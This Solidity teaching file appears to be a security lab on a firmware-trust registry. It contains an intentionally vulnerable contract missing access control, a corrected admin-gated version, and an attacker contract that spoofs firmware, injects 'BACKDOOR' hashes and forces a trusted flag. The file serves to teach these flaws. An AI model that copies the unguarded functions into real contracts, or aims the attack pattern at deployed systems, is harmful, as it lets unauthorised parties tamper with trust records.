// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB: "Extensible Firmware Interface (EFI)"
 *
 * 1. EFIFirmwareInsecure  – vulnerable EFI registry
 * 2. EFIFirmwareSecure    – secure/defended version
 * 3. EFIFirmwareAttacker  – attacks insecure version
 *
 * The model:
 *   Devices register firmware images with fields:
 *   - version
 *   - firmwareHash
 *   - trusted flag
 *   - securityLevel
 */

/*//////////////////////////////////////////////////////////////
//                   INSECURE EFI VERSION
//////////////////////////////////////////////////////////////*/

contract EFIFirmwareInsecure {
    struct Firmware {
        string version;      // e.g. "1.0.0"
        bytes32 firmwareHash;
        uint8 securityLevel; // 0 = low, 1 = mid, 2 = high
        bool trusted;
        address owner;
    }

    mapping(address => Firmware) public firmwareOf;

    event FirmwareRegistered(address indexed device, string version, bytes32 hash);
    event FirmwareUpdated(address indexed device, string version, bytes32 hash);
    event TrustForced(address indexed device, bool trusted);

    /**
     * ⚠️ VULN #1:
     * Anyone can register firmware for any device.
     */
    function registerFirmware(
        address device,
        string calldata version,
        bytes32 hash,
        uint8 securityLevel
    ) external {
        firmwareOf[device] = Firmware({
            version: version,
            firmwareHash: hash,
            securityLevel: securityLevel,
            trusted: false,
            owner: device
        });

        emit FirmwareRegistered(device, version, hash);
    }

    /**
     * ⚠️ VULN #2:
     * ANY caller may update firmware for ANY device.
     */
    function updateFirmware(
        address device,
        string calldata newVersion,
        bytes32 newHash
    ) external {
        Firmware storage fw = firmwareOf[device];
        fw.version = newVersion;
        fw.firmwareHash = newHash;

        emit FirmwareUpdated(device, newVersion, newHash);
    }

    /**
     * ⚠️ VULN #3:
     * ANYONE can mark firmware as trusted.
     */
    function forceTrust(address device, bool status) external {
        firmwareOf[device].trusted = status;
        emit TrustForced(device, status);
    }

    /**
     * ⚠️ VULN #4:
     * Validation is blind.
     */
    function isFirmwareTrusted(address device) external view returns (bool) {
        return firmwareOf[device].trusted;
    }
}

/*//////////////////////////////////////////////////////////////
//                         OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                     SECURE EFI VERSION
//////////////////////////////////////////////////////////////*/

contract EFIFirmwareSecure is Ownable {
    struct Firmware {
        string version;
        bytes32 firmwareHash;
        uint8 securityLevel; // must be 0–2
        bool trusted;        // requires admin verification
        address owner;
    }

    mapping(address => Firmware) public firmwareOf;

    event FirmwareRegistered(address indexed device, string version, bytes32 hash);
    event FirmwareUpdated(address indexed device, string version, bytes32 hash);
    event FirmwareVerified(address indexed device, bool trusted);

    /**
     * Secure registration:
     * Only the owner (EFI authority / admin) can register firmware entries.
     */
    function registerFirmware(
        address device,
        string calldata version,
        bytes32 hash,
        uint8 securityLevel
    ) external onlyOwner {
        require(device != address(0), "BAD_DEVICE");
        require(securityLevel <= 2, "INVALID_SECURITY_LEVEL");

        firmwareOf[device] = Firmware({
            version: version,
            firmwareHash: hash,
            securityLevel: securityLevel,
            trusted: false,
            owner: device
        });

        emit FirmwareRegistered(device, version, hash);
    }

    /**
     * Firmware update restricted to owner(admin) only.
     */
    function updateFirmware(
        address device,
        string calldata version,
        bytes32 hash
    ) external onlyOwner {
        Firmware storage fw = firmwareOf[device];
        require(fw.owner != address(0), "NOT_REGISTERED");

        fw.version = version;
        fw.firmwareHash = hash;

        emit FirmwareUpdated(device, version, hash);
    }

    /**
     * Verified trust must come from admin only.
     */
    function verifyFirmware(address device, bool status) external onlyOwner {
        Firmware storage fw = firmwareOf[device];
        require(fw.owner != address(0), "NOT_REGISTERED");
        fw.trusted = status;

        emit FirmwareVerified(device, status);
    }

    /**
     * Proper validated check.
     */
    function isFirmwareTrusted(address device) external view returns (bool) {
        Firmware memory fw = firmwareOf[device];
        return fw.trusted && fw.securityLevel >= 1;
    }
}

/*//////////////////////////////////////////////////////////////
//                         ATTACKER
//////////////////////////////////////////////////////////////*/

contract EFIFirmwareAttacker {
    EFIFirmwareInsecure public target;

    constructor(address _target) {
        target = EFIFirmwareInsecure(_target);
    }

    /**
     * Attack #1: Spoof firmware for any device.
     */
    function spoofFirmware(address victim) public {
        target.registerFirmware(
            victim,
            "BACKDOOR-1.0",
            keccak256(abi.encodePacked("malicious")),
            0
        );
    }

    /**
     * Attack #2: Override firmware hash + version.
     */
    function injectBackdoor(address victim) public {
        target.updateFirmware(
            victim,
            "BACKDOOR-2.0",
            keccak256(abi.encodePacked("rootkit_payload"))
        );
    }

    /**
     * Attack #3: Mark malicious firmware as trusted.
     */
    function forceTrusted(address victim) public {
        target.forceTrust(victim, true);
    }

    /**
     * Full automatic EFI compromise.
     */
    function fullAttack(address victim) external {
        spoofFirmware(victim);
        injectBackdoor(victim);
        forceTrusted(victim);
    }
}
